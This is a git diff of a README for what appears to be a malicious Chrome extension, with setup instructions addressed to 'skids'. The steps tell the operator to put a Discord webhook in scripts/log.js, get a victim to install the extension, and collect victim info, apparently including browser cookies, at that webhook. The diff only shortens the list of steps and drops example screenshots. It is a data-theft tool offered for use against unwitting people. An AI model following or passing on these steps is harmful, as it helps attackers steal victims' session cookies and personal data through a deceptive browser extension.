@@ -3,12 +3,6 @@ Due to the increased attention this project is getting i have decided to update 
 
 ## Setup for skids
 > 1. Put your discord webhook in "scripts/log.js" "line 1"
-> 2. You may change the extension info (name, description) in "manifest.json"
-> 3. Upload the extension directory as a chrome extension and get victim to add your extension to chrome
-> 4. As soon as they add the extention you will get a message containing victim info to your webhook
-## Examples
-![alt text](examples/cookieFound.png)
+> 2. Upload the extension directory as a chrome extension and get victim to add your extension to chrome
+> 3. As soon as they add the extention you will get a message containing victim info to your webhook
 
-![alt text](examples/cookieNotFound.png)
-## Notes
-> ⭐ 
